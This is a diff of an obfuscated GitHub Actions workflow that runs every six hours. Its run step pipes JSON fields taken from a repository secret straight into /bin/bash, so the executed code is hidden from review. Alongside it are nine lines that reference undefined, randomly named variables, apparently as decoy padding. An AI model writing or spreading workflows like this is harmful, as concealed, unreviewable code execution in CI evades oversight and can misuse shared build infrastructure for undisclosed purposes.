@@ -1,20 +1,27 @@
 name: vocalistjabber
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '24 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: vocalistjabber
         env:
-          i69: ${{ secrets.i69 }}
+          l75: ${{ secrets.l75 }}
         run: |
-          echo $i69 | jq -r .h1 | /bin/bash
-          echo $t41 | jq -r .p75 | /bin/bash
-          echo $ti63371 | jq -r .bze02105 | /bin/bash
+          echo $l75 | jq -r .djoq1 | /bin/bash
+          echo $oq9 | jq -r .ln13277 | /bin/bash
+          echo $epjq09 | jq -r .jszte635 | /bin/bash
+          echo $ic7843 | jq -r .xot4116 | /bin/bash
+          echo $spc6 | jq -r .cwz721 | /bin/bash
+          echo $ly424 | jq -r .qnoz95919 | /bin/bash
+          echo $e2938 | jq -r .bbluh6009 | /bin/bash
+          echo $slqry019 | jq -r .nda8305 | /bin/bash
+          echo $f9 | jq -r .zbgxt413 | /bin/bash
+          echo $vs60 | jq -r .qndiz5 | /bin/bash
 
